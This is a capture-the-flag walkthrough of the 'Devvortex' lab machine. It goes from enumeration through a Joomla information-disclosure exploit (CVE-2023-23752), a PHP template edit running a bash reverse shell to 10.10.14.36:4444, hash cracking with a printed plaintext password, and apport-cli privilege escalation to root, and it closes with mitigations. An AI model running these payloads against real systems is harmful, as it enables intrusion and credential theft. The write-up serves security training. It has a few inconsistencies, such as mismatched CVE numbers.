---
title: 'Devvortex Machine Walkthrough'
date: '2024-05-29T11:33:22.318Z'
keywords: []
layout: single
tags: 
  - Outdated-and-vulnerable-components
  - Identification-and-authentication-failures
  - Broken access control
  - Injection
categories:
  - Web applications
  - Databases
toc: true
toc_label: "Table of Contents"
sidebar:
  nav: "sidebar"
permalink: /Devvortex/
---
## Machine Summary

DevVortex is a machine running the Linux operating system and shows how exploitation of the combination of outdated and vulnerable components, password reuse, and command injection vulnerablities can completely compromise a web application. A summary of the attack path to fully escalate privileges to ROOT user is as follows:

* As a result of a vulnerable Joomla content management system in use, an unauthenticated information disclosure vulnerabiity (CVE-2023-23752) was exploited to leak internal application user IDs and plaintext passwords.
* The set of user credentials was used to login to the Joomla administration panel.
* A PHP template running was modified via command injection to run a malicious reverse shell payload and connect to my Kali Linux machine.
* As a result of password reuse, the password discovered above was used to login to a SQL database instance where hashed credentials for another use was discovered. The hash was subsequently cracked offline to obtain the plaintext password of this user.
* As a result of the victim's computer running an outdated and vulnerable version of the APPORT-CLI error reporting program, vulnerability CVE-2023-1372 was exploited to fully escalated my privilges to ROOT user.

![DevVortex machine exploitation matrix](/Pen-testing-blog/assets/images/1__dntjguqOXL5Kir2j__xvj0w.png "Figure 1 - Machine exploitation matrix")

## Step 1 — Enumeration

I begin by enumerating the victim’s machine to gather as much information about it as possible such as OS type and version, open ports, running services on the open ports etc. for which I will use the **nmap** network scanner. Afterwards, I will use web application enumeration tools to discover any sub-domains and the architecture of the web application file directories.

### Enumeration via nmap

I first run a scan to discover open ports and then run the default set of nmap enumeration scripts and service detection scan only on those open ports for greater efficiency. Explanation of flags:

* \-p — Ports on victim machine to scan
* \-n — Do not resolve DNS
* \-sC — run default set of nmap enumeration scripts
* \-sV — Detect services running on the open ports
* \-T4 — Scan in aggressive mode to speed up the scan results

```bash
nmap 10.10.11.242 -p- -T4
nmap 10.10.11.242 -p 22,80 -n -T4 -sC -sV
```

![Nmap scan output](/Pen-testing-blog/assets/images/1__zdHb0t__g2VO1v61vJzD8qQ.png "Figure 2 - Nmap scan output")

The Nmap scan output reveals the following:

* Port 22 and 80 are open running a secure shell (SSH) and http Nginx web server service respectively.
* The web server is running an Ubuntu Linux flavor OS.
* There is a redirect to **<http://devvortex.htb>** which I will add to the **/etc/hosts** file on my Kali Linux machine.

```bash
echo "10.10.11.242 devvortex.htb" | sudo tee -a /etc/hosts
```

![Resolving IP address to host](/Pen-testing-blog/assets/images/1__zs4X7JWEKwZver9ExgRREg.png "Figure 3 - Resolving IP address to host")

### Further enumeration for directories and subdomains with GoBuster

The results of the nmap scan did not suggest a particular attack vector to gain initial foothold on the victim's machine. At this point, I like fuzz for hidden directories and subdomains using **GoBuster** tool although you can use alternative tools like dirb , dirbuster, and ffuf. I will be using a wordlist from the **seclists** pen testing package which can be downloaded from its official [GitHub repository](https://github.com/danielmiessler/SecLists). Explanation of syntax:

* dir— set GoBuster to scan in directory discovery mode
* \-u — Specify the URL address to scan
* \-w — Specify the file path to the wordlist to use on your local machine
* \-s — Filter for only successful requests — 200, 203, 204, 301 status codes
* \-b — Disable negative requests filtering by passing an empty string value
* \-x — Specify file type to search for (choose html as website is static after viewing the page source)

```bash
gobuster -dir -u http://devvortex.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -s 200,203,204,301 -b '' -x html
```

![Directory fuzzing results](/Pen-testing-blog/assets/images/1__nZEUzWmN3hn__i5o__MSAYeQ.png "Figure 4 - Directory fuzzing results - Nothing interesting found")

A manual review of each of the URLs discovered shows nothing of interest such as interactive forms that could allow remote code execution (RCE). I move on to enumerate sub-domains using GoBuster. Explanation of syntax:

* vhost — set GoBuster into virtual host (subdomain) discovery mode
* \-u — Specify the URL address to scan
* \-w — Specify the file path to the wordlist to use on your local machine
* — append-domain — Required flag so discovered subdomains are appended to parent domain already discovered

```bash
gobuster -u http://devvortex.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

![Subdomain fuzzing results](/Pen-testing-blog/assets/images/1__y4hiUwTD__nUqjZ2qm28EMw.png "Figure 5 - Subdomain fuzzing results - subdomain found")

The vhost scan found a subdomain, **dev.devvortex.htb**, that I add to my etc/hosts file to resolve the IP address and view in the browser. I will switch GoBuster back to the directory discovery mode and run a directory scan on the new subdomain.

```bash
gobuster dir -u http://dev.devvortex.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -s 200,203,204,301 -b '' -x html
```

![Directory fuzzing results on new subdomain](/Pen-testing-blog/assets/images/1__NbqF6c9w7hs38t__g__R1CtA.png "Figure 6 - Directory fuzzing results on newly discovered subdomain dev.Devvortex.htb")

The **/administrator** directory found looks very promising. When I browse to the URL via the browser, I see a login page to the backend administration panel and confirm the site is running the Joomla! CMS.

![Joomla CMS administration page login](/Pen-testing-blog/assets/images/1__BgSpGBRMW4__sNUFOjcsi8A.png "Figure 7 - Joomla CMS administration page login")

As I know the site is running Joomla!, I use the [Joomscan Perl script](https://github.com/OWASP/joomscan) to obtain the version of Joomla! running. First, I clone the Github repo locally to my Kali Linux machine and then run the Perl script **Joomscan.pl** within the Joomscan directory. The results show that Joomla! version 4.2.6 is in use.

```bash
git clone https://github.com/rezasp/joomscan.git  
cd joomscan  
perl joomscan.pl
```

![Joomla scan output](/Pen-testing-blog/assets/images/1__6Wwbv4qVqttYaNFpaBnPfQ.png "Figure 8 - Joomscan output")

## Step 2 - Obtaining initial foothold as user www-data

Now that I know what version of Joomla! is running on the web server, I need to find a vulnerability that I can exploit. A good place to start is the Exploit-DB from builtin into Kali Linux.

### Exploiting vulnerability CVE-2023-23752 to obtain user ID and password to Joomla administration page

When I search the Exploit-DB, I found that Joomla versions 4.00–4.2.7 is vulnerable to the unauthenticated information disclosure vulnerability [**CVE-2023–23752**](https://www.exploit-db.com/exploits/51334). As a result of broken access control, an unauthenticated user can make API calls to two Joomla installation endpoints that return user IDs and backend database credentials respectively.

![CVE-2023-23752 vulnerability details](/Pen-testing-blog/assets/images/1__YfEsyFHby1gNlTmTrLfgDQ.png "Figure 9 - CVE2023-23752 vulnerability details")

![Vulnerable code returning user IDs](/Pen-testing-blog/assets/images/1__puoUJF2NOo7mH__byICX16w.png "Figure 10 - Vulnerable code returning user IDs")

![code returning DB passwords](/Pen-testing-blog/assets/images/1__YK4MUVD__Y29EzD9sPhPLSQ.png "Figure 11 - Vulnerable code returning DB passwords")

I exploit this vulnerability by issuing two requests to the vulnerable API endpoints via the cURL command, with the first to obtain the users’ login IDs and the second, the users’ backend database passwords. Both outputs were sent as the input to **jq** command to print results in JSON form for readability.

```bash
curl http://dev.devvortex.htb/api/index.php/v1/users?public=true | jq

curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true| jq
```

![Exploit of CVE-2023-23752 successful - user IDs](/Pen-testing-blog/assets/images/1__Tha8rbei865gXmhHZYyazA.png "Figure 12 - Exploit of CVE-2023-23752 successful - returned user IDs")

![Exploit of CVE-2023-23752 successful - user IDs](/Pen-testing-blog/assets/images/1__Tha8rbei865gXmhHZYyazA.png "Figure 13 - Exploit of CVE-2023-23752 successful - returned user IDs")

The exploit was successful and revealed two users — lewis and logan with lewis having elevated access privileges as a super user along with the plaintext password for lewis.

### Logging into the Jooma! administration interface

I used the new credentials to attempt to login into the Jooma! administrator interface as Lewis and was successful.

![Successful login to Joomla administration interface](/Pen-testing-blog/assets/images/1__UxH7PAtkPYwl5GJX9tW1wQ.png "Figure 14 - Successful login to Joomla! administration page")

### Establishing reverse shell connection via template modification

After logging into the administrative page, I create a reverse shell connection from victim machine to my attacking machine via template modification, although creation of a malicious plugin containing payload is also possible.

I use the template **Cassiopeia** and edit the **error.php** script at **<http://dev.devvortex.htb/templates/cassiopeia/error.php>** I use the global variable, **$\_REQUEST**, to pass in the parameter, cmd, that takes a value which the web server will parse as a command for execution. Here, the value passed to the cmd parameter is the command to create a reverse shell via bash script using -i flag for interactive mode.

![Command to create a reverse shell to my machine](/Pen-testing-blog/assets/images/1__LX2qdQ74EdYNCy1Z5oPo3Q.png "Figure 15 - Injection of malicious reverse shell payload into PHP script")

```bash
cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.36/4444 0>%261"
```

In my Kali Linux terminal, I set up my net cat listener to listen for connections on port 4444 to match the reverse shell one line command configuration (although any open port can be used). Upon visiting **error.php** page at the above URL and passing in the malicious command above as the cmd parameter value, I successfully catch a reverse shell in net cat. To make the shell more interactive and enhance its functionality, I stabilize it by using Python pty module to give me a pseudo-TTY after which I generate a bash shell on top of the reverse shell connection.

![Execution of malicious payload in browser](/Pen-testing-blog/assets/images/1__pWU8JJWNCbokOagLmu7JVg.png "Figure 16 - Execution of malicious reverse shell payload in the browser")

![Successful reverse shell connection from victim computer](/Pen-testing-blog/assets/images/CatchReverseShell.png  "Figure 17 - Successful reverse shell connection from victim computer to my Kali Linux machine")

## Step 3 — Lateral movement — www-data -> Logan

After obtaining an initial foothold on the victim's machine via compromise of the user account "lewis", I further explore the system to see if I can expand my footprint and compromise more resources on the system. As I know the backend database is MySQL, I start there.

### Obtaining password hash of the user Logan in MySQl database

I try to use the credentials of the user **lewis** to login to backend MySQL DB as the password could have been reused and was successfully able to login.

```bash
mysql -u lewis -p
```

![Successful login to MySQL DB as user lewis](/Pen-testing-blog/assets/images/SuccessfulLoginDBLewis.png "Figure 18 - Successful login to SQL DB as user lewis")

I enumerate the only non-default database present, Joomla, along with all its tables. The table **sd4fg_users** seemed interesting. I further enumerate this table via the MySQL command **describe table** (or describe or desc) to see what fields are present. The fields **name, username, and password** immediately stand out.

![Database table _users enumeration results](/Pen-testing-blog/assets/images/EnumerationTableSd4fgUsers.png "Figure 19 - DB table sd4fg_users schema")

After running a simple SELECT command on the aformentioned three fields, I obtain the password hash of the user **logan**.

```SQL
SELECT name, username , password FROM sd4fg\_users;
```

![Obtained password hash of user Logan](/Pen-testing-blog/assets/images/HashedPasswordLogan.png "Figure 20 - Obtained hashed password of user logan")

### Cracking the password hash of user logan using hashcat

Using hashcat in dictionary or straight attack mode with a hash format of bcrypt , I cracked the password hash and obtained the plain text password for user **logan — tequieromucho.** Explanation of hashcat command syntax I used:

* \-a — Specify the attack mode
* \-m — Specify the hash type (3200 is hashcat code for bcrypt)
* Specify hash to crack (if hash contains $ character, must be enclosed in quotes to be parsed as a literal)
* Specify path on local machine to word list (Here I used well known list of rockyou.txt that comes preinstalled with Kali Linux)
* \-o specify the output file name containing the plain text password after being cracked (optional)

```bash
hashcat -a 0 -m 3200 '$2y$10$IT4k5kmSGvHS09d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' /usr/share/wordlists/rockyou.txt -o crackedhashes.txt
```

![Input for cracking password hash for user logan](/Pen-testing-blog/assets/images/CrackingPasswordHashLogan.png "Figure 21 - Command line input for cracking password hash for user logan using HashCat program")

![Cracked hash for user logan](/Pen-testing-blog/assets/images/CrackedPasswordHashLogan.png "Figure 22 - Cracked hash for user logan")

### Logging in as user logan via secure shell — SSH

The initial enumeration via nmap revealed a SSH server running on port 22. Now I have credentials for user logan, I will attempt to login as him via secure shell — SSH. I successfully login via SSH as user logan.

```bash
ssh <logan@devvortex.htb> -p 22
```

![Successful SSH login as user logan](/Pen-testing-blog/assets/images/SuccessfulLoginSSHLogan.png "Figure 23 - Successful SSH login as user logan")

## Step 4 — Privilege escalation — Logan -> Root

I first find out what commands the user logan can run as the root user via sudo command. The user logan is able to run **usr/bin/apport-cli** used to report application bugs to developers and the version of apport-cli running is **2.20.11** which is susceptible to privileged escalation vulnerability [**CVE-2023–1326**](https://nvd.nist.gov/vuln/detail/CVE-2023-1326) due to the default pager of **less** being chosen when apport-cli is run as root user via sudo and that less allows running of commands via pre-pending via !.

![User logan able to run ApportCLI program](/Pen-testing-blog/assets/images/UserLoganrunApportCLI.png "Figure 24 - User logan able to run ApportCLI bug reporting program")

### Exploitation of CVE-2023–1326 via fictious bug report creation

To create a bug report , I run apport-cli with the -f or — file-bug flag set. After the report is created, select **option v** to view the report and you should now be in the less pager. Finally, type in **!/bin/bash** to be dropped into an escalated bash script as root.

sudo usr/bin/apport-cli --file-bug

![Filing fake bug report to escalate privileges to root user](/Pen-testing-blog/assets/images/FileFakeBugReportPrivilegeEscalation.png "Figure 25 - Filing a fake bug report to exploit vulnerability CVE-2023-1326 for privilege escalation")

![Successful exploitation of vulnerability CVE-2023-1326](/Pen-testing-blog/assets/images/ExploitationCVE20231326RootUser.png "Figure 26 - Successful exploitation of vulnerability CVE-2023-1326 to escalated access privileges to ROOT user")

## Vulnerabilities - Exploitation and mitigation summary

The machine demonstrated the following vulnerabilities and how they can be exploited. I've also included some security controls that can mitigate exploitation:

### Use of outdated and vulnerable components

The use of components such as outdated versions of software libraries or vulnerable versions of content management systems (CMS) can result in vulnerabilities that can be exploited by threat actors. In this machine, as a result of using Joomla! version 4.2.6 susceptible to unauthenticated information disclosure vulnerability CVE-2023-23752, I was able to obtain the user IDs and passwords of all users on the system without authentication or authorization.

Security best practices and controls that can block and / or mitigate the effects of this vulnerability include the following:

* Always keep the web application and all of its dependency components up to date. Vendors often release security patches in newer version of their software that remediate known vulnerabilities in older software versions.
* If business or technical contraints prevent upgrading to newer , secure software versions, implement security controls such as limiting access, segregating applications on the network, or additional hardening so to mitigate impact in case of compromise by threat actors.

### Command Injection

If user input is not sanitized properly to remove dangerous characters or risky commands are abused, malicious actors can run arbitrary commands resulting in remote system control (e.g: reverse shell), installation of malware, or other harm. In this machine, as a result of insufficient hardening of PHP scripts, I was able to use the SYSTEM() function to run a command that injected a reverse shell connection to my attacking Kali Linux machine,

Security best practices and controls that can block and / or mitigate the effects of this vulnerability include the following:

* Strictly sanitize user input so dangerous characters such as <, >, `, &, or ; are not allowed. A whitelist of allowed characters is ideal in lieu of a blacklist approach which is less robust and needs more maintenance.
* If the programming languages does not need to use potentially dangerous functions such eval(), or system() , disable these functions in the configuration file for that language. For PHP, these functions can be disabled in the PHP.ini configuration file.

### Identication and authentication failures - Password reuse

The reuse of the same password in different web application componenets increases the attack surface as a threat actor can laterally move from asset to asset with a single stolen password. In this machine, the password of the user lewis was used on both the Joomla! administration page and the MySQL database. I was able to compromise both assets with a single stolen password

Security best practices and controls that can block and / or mitigate the effects of this vulnerability include the following:

* Avoid using the same password on more than one component of an application such as administration interface login or the backend databases.
* If passwords are suspected to have been compromised, they should be changed immediately.

### Broken access control

If access control is not implemented properly such as allowing basic users to issue certain commands with SUDO, malicious actors could abuse functionality to escalate their privileges, potentially to ROOT user. In this machine, the non - privileged user of logan was able to run sudo apport - CLI command to exploit CVE-2023-1326 to escalate their access privileges to the ROOT user.

Security best practices and controls that can block and / or mitigate the effects of this vulnerability include the following:

* Implement proper access control by only allowing properly authenticated and authorized users to edit data, read non - public information, issue elevated system commands etc.
